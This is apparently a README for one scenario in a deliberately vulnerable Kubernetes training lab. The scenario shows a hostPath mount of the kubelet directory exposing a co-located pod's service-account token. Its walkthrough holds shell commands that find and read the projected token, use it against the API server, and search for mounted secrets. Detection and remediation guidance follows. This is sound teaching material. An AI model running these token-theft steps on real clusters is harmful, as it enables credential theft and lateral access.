# Scenario 04 — Sensitive hostPath Exposure

| | |
|---|---|
| **Vulnerability class** | Host filesystem access / credential exposure |
| **Difficulty** | ⭐⭐ Medium |
| **Backends** | kind and AKS; files are node-local |
| **Namespace** | `hostpath-esc` |
| **MITRE ATT&CK for Containers** | [T1611 Escape to Host](https://attack.mitre.org/techniques/T1611/), [T1552 Unsecured Credentials](https://attack.mitre.org/techniques/T1552/) |

## What it is

The attacker pod is not privileged and does not use host namespaces, but mounts
the node's kubelet pod directory and read-only `/etc` using `hostPath`. A
least-privilege victim pod is scheduled on the same node so its projected token
can be observed from the mounted kubelet directory.

## Why it matters

`hostPath` can cross the container boundary even when `privileged` is false.
Kubelet-managed directories may contain service-account tokens and mounted
secrets for pods on the same node. The stolen token retains only its original
RBAC permissions; the hostPath exposure and RBAC scope are separate controls.

## Deploy just this scenario

```powershell
kubectl apply -f scenarios/04-hostpath-node-escape/manifest.yaml
kubectl -n hostpath-esc wait --for=condition=Available deployment --all --timeout=180s
```

## Exploit walkthrough

```powershell
$pod = kubectl -n hostpath-esc get pod -l app=hostpath-app -o jsonpath='{.items[0].metadata.name}'
kubectl -n hostpath-esc exec -it $pod -- sh
```

Inside the attacker pod:

```sh
# The victim and attacker are scheduled on the same node by pod affinity.
find /host-kubelet -path '*kubernetes.io~projected*/token' 2>/dev/null | head
TOKEN_FILE=$(find /host-kubelet -path '*kubernetes.io~projected*/token' | head -1)
TOKEN=$(cat "$TOKEN_FILE")
echo "token bytes: ${#TOKEN}"

# Inspect the stolen token's actual namespace-scoped permissions.
apk add --no-cache curl >/dev/null
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/hostpath-esc/pods

# Look for other mounted Secret data on this node.
find /host-kubelet -path '*kubernetes.io~secret*' -type f 2>/dev/null | head
ls -l /host-etc/kubernetes/manifests 2>/dev/null
```

The victim token can list pods in `hostpath-esc` but cannot read secrets or
access other namespaces.

## What success looks like

The attacker pod reads a service-account token belonging to the victim pod
from the node filesystem and uses it to list pods in the permitted namespace.

## Detection

- Falco may report access to sensitive files and unexpected reads under the
  kubelet tree.
- Kubernetes audit records show creation of pods with sensitive hostPath
  volumes; API audit does not record later host filesystem reads.
- Kubescape and similar posture scanners flag sensitive hostPath mounts.

## Remediation

Disallow hostPath for application workloads. Use `emptyDir`, ConfigMap, Secret,
or CSI volumes instead. Enforce Pod Security Admission `restricted` or an
admission policy that blocks sensitive host paths.

**Before:** `hostPath: { path: /var/lib/kubelet/pods }`

**After:**

```yaml
volumes:
  - name: scratch
    emptyDir: {}
```

## Suggested order

Try this after scenarios 01 and 02. It demonstrates that filesystem mounts are
an independent path across the node boundary.
